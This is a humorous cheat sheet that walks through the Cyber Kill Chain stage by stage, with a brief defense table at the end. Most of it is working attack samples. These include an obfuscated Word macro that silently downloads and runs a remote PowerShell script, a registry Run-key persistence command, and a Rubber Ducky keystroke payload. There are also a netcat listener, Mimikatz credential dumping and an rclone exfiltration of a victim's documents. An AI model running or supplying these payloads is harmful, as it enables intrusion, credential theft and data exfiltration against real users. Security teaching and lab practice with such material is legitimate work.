# Cyber Kill Chain – Operation: PWN EVERYTHING
*Presented by: Agent 1337, InfoSec's slickest field operative*

_Includes working payload code samples for lab use._


## 1. Reconnaissance – “The Creeper’s Crawl”

| Field | Details |
|-------|---------|
| Mission | Know thy target. |
| Tactics | - Passive: Google dorking, LinkedIn stalking, Shodan scans<br>- Active: Phishing domain lookups, WHOIS scraping |
| Payloads | N/A (no code dropped here — just info slurped) |
| Tip | Try using “theHarvester” and see what emails and domains fall out like candy from a piñata. |

## 2. Weaponization – “Crafting the Digital Dagger”

| Field | Details |
|-------|---------|
| Mission | Combine malware with a delivery vehicle. |
| Tactics | - Malicious PDFs/Excels<br>- Bind reverse shell to installer |
| Payloads | - Meterpreter in a CV-laced PDF<br>- Emotet in invoice-themed Word doc<br>- PowerShell Empire script<br>It’s like putting a snake in a birthday cake. Only less festive. And more... root access. |
| Sample Code | Sub AutoOpen()<br>    Dim p1 As String, p2 As String, p3 As String<br>    p1 = "pow"<br>    p2 = "ers"<br>    p3 = "hell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')"<br>    Dim fullCmd As String<br>    fullCmd = p1 & p2 & p3<br>    Shell fullCmd, vbHide<br>End Sub |

## 3. Delivery – “The Trojan Horse Uber Eats Edition”

| Field | Details |
|-------|---------|
| Mission | Get the payload to the victim. |
| Tactics | - Phishing emails<br>- Drive-by downloads<br>- USB drops |
| Payloads | - Malicious login links<br>- MalDoc macro<br>- Rubber Ducky USB scripts |
| Tip | Can you spot the phishing email before HR opens it? |

## 4. Exploitation – “The Big Bang”

| Field | Details |
|-------|---------|
| Mission | Trigger the payload to breach the system. |
| Tactics | - Macros<br>- Zero-day exploits<br>- JavaScript payloads |
| Payloads | - CVE-2021-40444<br>- Log4Shell<br>- Cobalt Strike beacon |
| Tip | User: “Why is my screen flickering?”<br>Attacker: “That’s just... your new dark mode.” |

## 5. Installation – “Staying for Dinner”

| Field | Details |
|-------|---------|
| Mission | Set up shop. |
| Tactics | - Backdoors<br>- Registry run keys<br>- RATs |
| Payloads | - NanoCore<br>- Cobalt Strike<br>- Encoded PowerShell in scheduled task |
| Tip | Always check your startup programs. |
| Sample Code | Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')" |

## 6. Command and Control (C2) – “Hello from the Other Side”

| Field | Details |
|-------|---------|
| Mission | Maintain remote access and issue commands. |
| Tactics | - HTTPS<br>- DNS tunneling<br>- Cloud-based C2 |
| Payloads | - Metasploit beacon<br>- Sliver C2<br>- Discord bot |
| Tip | Try setting up a simulated C2 in a lab. |
| Sample Code | # Netcat listener<br>nc -lvnp 443<br><br># Python HTTP server<br>python3 -m http.server 80 |

## 7. Actions on Objectives – “Data, Gold, and Glory”

| Field | Details |
|-------|---------|
| Mission | Exfiltrate, destroy, encrypt, or spy. |
| Tactics | - Data exfil<br>- Ransomware<br>- Credential harvesting |
| Payloads | - Rclone<br>- LockBit/BlackCat<br>- Mimikatz |
| Tip | If you hear ‘your files have been encrypted,’ the party’s over. |
| Sample Code | # Mimikatz<br>sekurlsa::logonpasswords<br><br># Rclone exfil<br>rclone copy C:\Users\victim\Documents remote:loot --config rclone.conf |

## Bonus Level: DEFENSE MODE – Your Counterplay

| Field | Details |
|-------|---------|
| Defense Tactics | Recon: Monitor open-source mentions<br>Delivery: Email filtering + awareness<br>Exploit/Install: EDR + patching<br>C2: Detect beaconing patterns<br>Objectives: DLP, SIEM alerts, segmentation |

## Bonus Payload – Rubber Ducky Ninja Moves

| Field | Details |
|-------|---------|
| Ducky Script | DELAY 1000<br>GUI r<br>DELAY 500<br>STRING powershell -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')"<br>ENTER |
| shell.ps1 | Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "powershell -w hidden -nop -c IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')" |





